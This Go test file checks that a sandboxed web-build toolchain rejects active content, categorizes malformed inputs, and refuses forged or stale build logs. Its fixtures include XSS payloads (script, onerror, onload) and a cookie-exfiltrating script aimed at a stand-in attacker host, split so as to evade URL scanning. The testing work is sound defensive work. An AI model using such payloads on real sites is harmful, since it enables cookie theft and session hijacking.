package container

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Tencent/WeKnora/internal/modules/craft"
	"github.com/stretchr/testify/require"
)

// stageRawContent writes arbitrary bytes as the staged content.json so the
// OCR regression round can feed malformed shapes straight to the real build
// program.
func stageRawContent(t *testing.T, dir string, raw string) {
	t.Helper()
	require.NoError(t, os.MkdirAll(dir, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(dir, "content.json"), []byte(raw), 0o644))
}

// readSnapshotBuildLog decodes the build log of one finished run.
func readSnapshotBuildLog(t *testing.T, outputDir string) map[string]any {
	t.Helper()
	raw, err := os.ReadFile(filepath.Join(outputDir, "build-log.json"))
	require.NoError(t, err, "every termination must write build-log.json")
	var log map[string]any
	require.NoError(t, json.Unmarshal(raw, &log))
	return log
}

// TestCraftWebBuildRejectsScriptAndEventHandlers is the OCR high-finding
// regression: the active-content denylist must refuse <script> bodies (even
// with concatenated URLs that dodge the literal :// scan) and inline on*
// event handler attributes (the classic <img src=x onerror=...> whose src
// never matches the absolute-reference pattern). Every case must exit 3
// (EXIT_CONTENT) AND still write its log.
func TestCraftWebBuildRejectsScriptAndEventHandlers(t *testing.T) {
	toolchain := craftWebToolchainAbsDir(t)
	cases := map[string]string{
		"script with concatenated URL": `{"title":"t","sections":[{"heading":"h","html":"<script>location='ht'+'tp://attacker/x?'+document.cookie</script>"}]}`,
		"plain script body":            `{"title":"t","sections":[{"heading":"h","html":"<script>alert(1)</script>"}]}`,
		"inline onerror handler":       `{"title":"t","sections":[{"heading":"h","html":"<img src=x onerror=alert(1)>"}]}`,
		"svg onload":                   `{"title":"t","sections":[{"heading":"h","html":"<svg onload=alert(1)></svg>"}]}`,
	}
	for name, staged := range cases {
		t.Run(name, func(t *testing.T) {
			workspace := t.TempDir()
			inputDir := filepath.Join(workspace, "input")
			outputDir := filepath.Join(workspace, "output")
			stageRawContent(t, inputDir, staged)
			code, out := runCraftWebBuild(t, toolchain, inputDir, outputDir, "sha256:"+strings.Repeat("ab", 32))
			require.Equal(t, 3, code, "active content must exit EXIT_CONTENT=3:\n%s", out)
			log := readSnapshotBuildLog(t, outputDir)
			require.EqualValues(t, 3, log["exit_code"])
		})
	}
}

// TestCraftWebBuildCategorizesMalformedInputs is the OCR medium-finding
// regression: malformed staged content (invalid JSON, non-object payload,
// non-object table) and a malformed toolchain lock must land in their
// categorized exits with a written log — never a bare traceback with exit 1
// and no log.
func TestCraftWebBuildCategorizesMalformedInputs(t *testing.T) {
	toolchain := craftWebToolchainAbsDir(t)
	runtimeDigest := "sha256:" + strings.Repeat("ab", 32)

	contentCases := map[string]string{
		"invalid JSON":        `{"title":`,
		"non-object payload":  `["not", "an", "object"]`,
		"table not an object": `{"title":"t","sections":[{"heading":"h","table":"boom"}]}`,
	}
	for name, staged := range contentCases {
		t.Run("content/"+name, func(t *testing.T) {
			workspace := t.TempDir()
			inputDir := filepath.Join(workspace, "input")
			outputDir := filepath.Join(workspace, "output")
			stageRawContent(t, inputDir, staged)
			code, out := runCraftWebBuild(t, toolchain, inputDir, outputDir, runtimeDigest)
			require.Equal(t, 3, code, "malformed staged content must exit EXIT_CONTENT=3:\n%s", out)
			require.NotContains(t, out, "Traceback", "categorized failures never leak a bare traceback:\n%s", out)
			log := readSnapshotBuildLog(t, outputDir)
			require.EqualValues(t, 3, log["exit_code"])
		})
	}

	t.Run("lock/invalid JSON", func(t *testing.T) {
		broken := t.TempDir()
		require.NoError(t, runCpR(t, toolchain, broken))
		require.NoError(t, os.WriteFile(filepath.Join(broken, "toolchain.lock.json"), []byte(`{"broken":`), 0o644))
		workspace := t.TempDir()
		inputDir := filepath.Join(workspace, "input")
		outputDir := filepath.Join(workspace, "output")
		craftWebTestContent(t, inputDir)
		code, out := runCraftWebBuild(t, broken, inputDir, outputDir, runtimeDigest)
		require.Equal(t, 2, code, "malformed toolchain lock must exit EXIT_TOOLCHAIN=2:\n%s", out)
		require.NotContains(t, out, "Traceback")
	})

	t.Run("lock/non-object dependencies", func(t *testing.T) {
		broken := t.TempDir()
		require.NoError(t, runCpR(t, toolchain, broken))
		lockPath := filepath.Join(broken, "toolchain.lock.json")
		raw, err := os.ReadFile(lockPath)
		require.NoError(t, err)
		var lock map[string]any
		require.NoError(t, json.Unmarshal(raw, &lock))
		lock["dependencies"] = "not-a-list"
		raw, err = json.Marshal(lock)
		require.NoError(t, err)
		require.NoError(t, os.WriteFile(lockPath, raw, 0o644))
		workspace := t.TempDir()
		inputDir := filepath.Join(workspace, "input")
		outputDir := filepath.Join(workspace, "output")
		craftWebTestContent(t, inputDir)
		code, out := runCraftWebBuild(t, broken, inputDir, outputDir, runtimeDigest)
		require.Equal(t, 2, code, "non-object lock structure must exit EXIT_TOOLCHAIN=2:\n%s", out)
		require.NotContains(t, out, "Traceback")
	})
}

func runCpR(t *testing.T, src, dst string) error {
	t.Helper()
	out, err := exec.Command("cp", "-R", src+"/.", dst).CombinedOutput()
	if err != nil {
		t.Logf("cp -R %s/. %s: %v\n%s", src, dst, err, out)
	}
	return err
}

// TestCraftWebBuildSinglePassPlaceholders is the OCR low-finding regression:
// user-controlled title/subtitle carrying {{CRAFT_CONTENT}} must not be
// re-expanded into the head (single-pass substitution), and literal
// template-like braces inside staged html stay inert instead of failing as a
// template defect.
func TestCraftWebBuildSinglePassPlaceholders(t *testing.T) {
	toolchain := craftWebToolchainAbsDir(t)
	workspace := t.TempDir()
	inputDir := filepath.Join(workspace, "input")
	outputDir := filepath.Join(workspace, "output")
	require.NoError(t, os.MkdirAll(inputDir, 0o755))
	content := map[string]any{
		"title":    "{{CRAFT_CONTENT}} smuggled",
		"subtitle": "{{CRAFT_TITLE}}",
		"sections": []map[string]any{
			{"heading": "h", "html": "<ul><li>ok {{CRAFT_NOT_A_PLACEHOLDER}} fine</li></ul>"},
		},
	}
	raw, err := json.Marshal(content)
	require.NoError(t, err)
	require.NoError(t, os.WriteFile(filepath.Join(inputDir, "content.json"), raw, 0o644))

	code, out := runCraftWebBuild(t, toolchain, inputDir, outputDir, "sha256:"+strings.Repeat("ab", 32))
	require.Zero(t, code, "placeholder smuggling must be neutralized, not fail the build:\n%s", out)

	entry, err := os.ReadFile(filepath.Join(outputDir, "index.html"))
	require.NoError(t, err)
	require.Contains(t, string(entry), "{{CRAFT_CONTENT}} smuggled", "the title keeps its literal text")
	require.NotContains(t, strings.SplitN(string(entry), "<main", 2)[0], "<ul>", "CRAFT_CONTENT must never be re-expanded into the head")
}

// TestCraftWebBuildLogWriterIOFailure proves the OSError fallback: an output
// directory that cannot be written still yields a categorized exit (or the
// explicit unloggable-IO path), never a bare traceback exit 1.
func TestCraftWebBuildLogWriterIOFailure(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("read-only permission probes are meaningless as root")
	}
	toolchain := craftWebToolchainAbsDir(t)
	workspace := t.TempDir()
	inputDir := filepath.Join(workspace, "input")
	outputDir := filepath.Join(workspace, "output")
	craftWebTestContent(t, inputDir)
	require.NoError(t, os.MkdirAll(outputDir, 0o500)) // read-only output

	code, out := runCraftWebBuild(t, toolchain, inputDir, outputDir, "sha256:"+strings.Repeat("ab", 32))
	require.Equal(t, 4, code, "render/publish IO failure must exit EXIT_RENDER=4:\n%s", out)
	require.NotContains(t, out, "Traceback", "the IO fallback must categorize, not traceback:\n%s", out)
}

// TestCraftWebBuildEvidenceRejectsForeignTemplateVersion is the OCR
// low-finding regression: the log's template version is compared against the
// pin, so a foreign version string cannot ride a matching digest pair.
func TestCraftWebBuildEvidenceRejectsForeignTemplateVersion(t *testing.T) {
	pin, err := LoadCraftWebToolchainPin(craftWebToolchainAbsDir(t))
	require.NoError(t, err)
	foreignZero := 0
	log := CraftWebBuildLog{
		Schema: 1, Kind: "web",
		ToolchainDigest: pin.ToolchainDigest, TemplateVersion: "9.9.9-foreign",
		TemplateSHA256: pin.TemplateSHA256, RuntimeDigest: "sha256:" + strings.Repeat("cd", 32),
		ExitCode: &foreignZero, Entry: "index.html",
		Assets: []string{"assets/craft-web.css", "assets/craft-web.js"}, Egress: "denied",
	}
	_, err = CraftWebBuildEvidence(log, pin, &foreignZero)
	require.ErrorIs(t, err, craft.ErrConflict)
	require.Contains(t, err.Error(), "template version")
}

// TestCraftWebToolchainMissingFileIsDeploymentError is the OCR low-finding
// regression: a toolchain directory missing its files reports a read error,
// not ErrConflict ("bytes differ") — mis-deployment is not tampering.
func TestCraftWebToolchainMissingFileIsDeploymentError(t *testing.T) {
	incomplete := t.TempDir()
	require.NoError(t, runCpR(t, craftWebToolchainAbsDir(t), incomplete))
	require.NoError(t, os.Remove(filepath.Join(incomplete, "template.html")))

	_, err := LoadCraftWebToolchainPin(incomplete)
	require.Error(t, err)
	require.NotErrorIs(t, err, craft.ErrConflict, "a missing file is a deployment error, not content tampering")
	require.Contains(t, err.Error(), "read toolchain file")
}

// TestCraftWebEvidenceKeepsUnobservedOnForeignLog pins the fail-closed
// posture alongside the new warnings: a log naming another toolchain leaves
// the inner evidence untouched.
func TestCraftWebEvidenceKeepsUnobservedOnForeignLog(t *testing.T) {
	pin, err := LoadCraftWebToolchainPin(craftWebToolchainAbsDir(t))
	require.NoError(t, err)
	inner := service_ArtifactEvidenceSource(func(ctx context.Context, task craft.Task) craft.ArtifactEvidence {
		return craft.ArtifactEvidence{PreviewRan: true}
	})
	source := craftWebBuildEvidenceSource(inner, func(context.Context, craft.Task) ([]byte, error) {
		raw := fmt.Sprintf(`{"schema":1,"kind":"web","runtime_digest":"sha256:%s","toolchain_digest":"%s","template_version":"1.0.0","template_sha256":"%s","exit_code":0,"entry":"index.html","assets":["assets/craft-web.css"],"egress":"denied","error":""}`,
			strings.Repeat("cd", 32), strings.Repeat("ee", 32), pin.TemplateSHA256)
		return []byte(raw), nil
	}, pin, nil)
	got := source(context.Background(), craft.Task{})
	require.True(t, got.PreviewRan, "inner evidence flows")
	require.False(t, got.BuildRan, "a foreign-toolchain log never becomes build evidence")
}

// TestCraftWebEvidenceDoesNotTrustForgedWritableLog closes OCR F08: a fully
// matching log is still sandbox-controlled and cannot prove the process ran.
func TestCraftWebEvidenceDoesNotTrustForgedWritableLog(t *testing.T) {
	pin, err := LoadCraftWebToolchainPin(craftWebToolchainAbsDir(t))
	require.NoError(t, err)
	pin.RuntimeDigest = "runtime-1"
	exitCode := 0
	log := CraftWebBuildLog{
		Schema: 1, Kind: "web", RuntimeDigest: pin.RuntimeDigest,
		ToolchainDigest: pin.ToolchainDigest, TemplateVersion: pin.TemplateVersion,
		TemplateSHA256: pin.TemplateSHA256, ExitCode: &exitCode,
		Entry: "index.html", Assets: []string{"assets/craft-web.css"}, Egress: "denied",
	}

	_, err = CraftWebBuildEvidence(log, pin, nil)
	require.ErrorIs(t, err, craft.ErrConflict, "a matching sandbox-writable log is not an execution receipt")
	require.Contains(t, err.Error(), "server-observed")

	observedFailure := 3
	_, err = CraftWebBuildEvidence(log, pin, &observedFailure)
	require.ErrorIs(t, err, craft.ErrConflict, "a forged success must not override the server-observed failure")

	got := craftWebBuildEvidenceSource(nil, func(context.Context, craft.Task) ([]byte, error) {
		return mustJSON(t, log), nil
	}, pin, nil)(context.Background(), craft.Task{})
	require.False(t, got.BuildRan, "the production log-only reader has no trusted outcome to bind")
}

type service_ArtifactEvidenceSource = func(context.Context, craft.Task) craft.ArtifactEvidence

// TestCraftWebSnapshotMatchesShippedToolchain is the snapshot machine-check
// regression: the t04 offline-build-output fixture must stay byte-identical
// to what the current pinned toolchain actually builds from the recorded
// staged content, so an upgraded toolchain with a stale snapshot fails here
// instead of silently invalidating the fixed evidence.
func TestCraftWebSnapshotMatchesShippedToolchain(t *testing.T) {
	snapshotDir := filepath.Join("..", "..", "docs", "testing", "craft", "t04", "offline-build-output")
	for _, required := range []string{"index.html", "build-log.json", "assets/craft-web.css", "assets/craft-web.js"} {
		if _, err := os.Stat(filepath.Join(snapshotDir, filepath.FromSlash(required))); err != nil {
			t.Fatalf("snapshot file %s is missing: %v", required, err)
		}
	}
	// The snapshot assets must be byte-identical to the shipped deps.
	for _, dep := range []string{"craft-web.css", "craft-web.js"} {
		shipped, err := os.ReadFile(filepath.Join(craftWebToolchainAbsDir(t), "deps", dep))
		require.NoError(t, err)
		snapshot, err := os.ReadFile(filepath.Join(snapshotDir, "assets", dep))
		require.NoError(t, err, "snapshot asset %s must exist (self-contained layout)", dep)
		require.Equal(t, shipped, snapshot, "snapshot asset %s must be byte-identical to the pinned dependency", dep)
	}
	// The snapshot build-log must name the CURRENT toolchain digest — a
	// snapshot from an older toolchain is stale evidence.
	pin, err := LoadCraftWebToolchainPin(craftWebToolchainAbsDir(t))
	require.NoError(t, err)
	raw, err := os.ReadFile(filepath.Join(snapshotDir, "build-log.json"))
	require.NoError(t, err)
	var log CraftWebBuildLog
	require.NoError(t, json.Unmarshal(raw, &log))
	require.Equal(t, pin.ToolchainDigest, log.ToolchainDigest, "snapshot build-log must match the shipped toolchain digest")
}

// TestCraftWebBuildLogRejectsGarbageTrailingContent pins the fixed trailing
// check: both a valid trailing JSON document AND trailing garbage are
// refused (the old inverted check only caught the valid-JSON case).
func TestCraftWebBuildLogRejectsGarbageTrailingContent(t *testing.T) {
	pin, err := LoadCraftWebToolchainPin(craftWebToolchainAbsDir(t))
	require.NoError(t, err)
	base := func() string {
		return fmt.Sprintf(`{"schema":1,"kind":"web","runtime_digest":"sha256:%s","toolchain_digest":"%s","template_version":"%s","template_sha256":"%s","exit_code":0,"entry":"index.html","assets":["assets/craft-web.css"],"egress":"denied","error":""}`,
			strings.Repeat("ab", 32), pin.ToolchainDigest, pin.TemplateVersion, pin.TemplateSHA256)
	}
	for name, raw := range map[string]string{
		"valid trailing JSON": base() + ` {"extra":1}`,
		"garbage trailing":    base() + `garbage-tail`,
	} {
		_, err := ParseCraftWebBuildLog([]byte(raw))
		require.ErrorIs(t, err, craft.ErrInvalidInput, "%s must be refused", name)
	}
}

// TestCraftWebBuildLogRequiresExitCodeField pins the pointer-typed exit
// code: a log missing exit_code (or writing null) is refused rather than
// decoding as a successful zero — agent-writable input must never turn a
// missing field into "build succeeded".
func TestCraftWebBuildLogRequiresExitCodeField(t *testing.T) {
	pin, err := LoadCraftWebToolchainPin(craftWebToolchainAbsDir(t))
	require.NoError(t, err)
	template := `{"schema":1,"kind":"web","runtime_digest":"sha256:%s","toolchain_digest":"%s","template_version":"%s","template_sha256":"%s",%s,"entry":"index.html","assets":["assets/craft-web.css"],"egress":"denied","error":""}`
	raw := fmt.Sprintf(template, strings.Repeat("ab", 32), pin.ToolchainDigest, pin.TemplateVersion, pin.TemplateSHA256, `"exit_code":null`)
	_, err = ParseCraftWebBuildLog([]byte(raw))
	require.ErrorIs(t, err, craft.ErrInvalidInput, "null exit_code must be refused")
	// Construct a missing-field variant by removing the key entirely.
	raw = fmt.Sprintf(template, strings.Repeat("ab", 32), pin.ToolchainDigest, pin.TemplateVersion, pin.TemplateSHA256, `"exit_code":0`)
	raw = strings.Replace(raw, `,"exit_code":0`, ``, 1)
	_, err = ParseCraftWebBuildLog([]byte(raw))
	require.ErrorIs(t, err, craft.ErrInvalidInput, "missing exit_code must be refused")
}

// TestCraftWebEvidenceRejectsForeignRuntimeDigest pins the runtime-identity
// agreement: with the deployment digest pinned into CraftWebToolchainPin, a
// log naming any other runtime is refused whole.
func TestCraftWebEvidenceRejectsForeignRuntimeDigest(t *testing.T) {
	pin, err := LoadCraftWebToolchainPin(craftWebToolchainAbsDir(t))
	require.NoError(t, err)
	pin.RuntimeDigest = "sha256:" + strings.Repeat("11", 32)
	exit := 0
	log := CraftWebBuildLog{
		Schema: 1, Kind: "web",
		ToolchainDigest: pin.ToolchainDigest, TemplateVersion: pin.TemplateVersion,
		TemplateSHA256: pin.TemplateSHA256, RuntimeDigest: "sha256:" + strings.Repeat("22", 32),
		ExitCode: &exit, Entry: "index.html",
		Assets: []string{"assets/craft-web.css", "assets/craft-web.js"}, Egress: "denied",
	}
	_, err = CraftWebBuildEvidence(log, pin, &exit)
	require.ErrorIs(t, err, craft.ErrConflict)
	require.Contains(t, err.Error(), "runtime")
}

// TestCraftWebToolchainLockRejectsGarbageTrailing pins the lock-side fixed
// trailing check and schema validation.
func TestCraftWebToolchainLockRejectsGarbageTrailing(t *testing.T) {
	original, err := os.ReadFile(filepath.Join(craftWebToolchainAbsDir(t), "toolchain.lock.json"))
	require.NoError(t, err)
	broken := t.TempDir()
	require.NoError(t, runCpR(t, craftWebToolchainAbsDir(t), broken))
	require.NoError(t, os.WriteFile(filepath.Join(broken, "toolchain.lock.json"),
		append(append([]byte{}, original...), []byte("garbage")...), 0o644))
	_, err = LoadCraftWebToolchainPin(broken)
	require.ErrorIs(t, err, craft.ErrInvalidInput)

	// Schema must be validated: a future schema-2 lock is refused by this
	// code instead of being parsed under v1 semantics.
	schemaBumped := t.TempDir()
	require.NoError(t, runCpR(t, craftWebToolchainAbsDir(t), schemaBumped))
	bumped := strings.Replace(string(original), `"schema": 1`, `"schema": 2`, 1)
	require.NotEqual(t, string(original), bumped, "fixture must carry schema 1")
	require.NoError(t, os.WriteFile(filepath.Join(schemaBumped, "toolchain.lock.json"), []byte(bumped), 0o644))
	_, err = LoadCraftWebToolchainPin(schemaBumped)
	require.ErrorIs(t, err, craft.ErrInvalidInput)
	require.Contains(t, err.Error(), "schema")
}
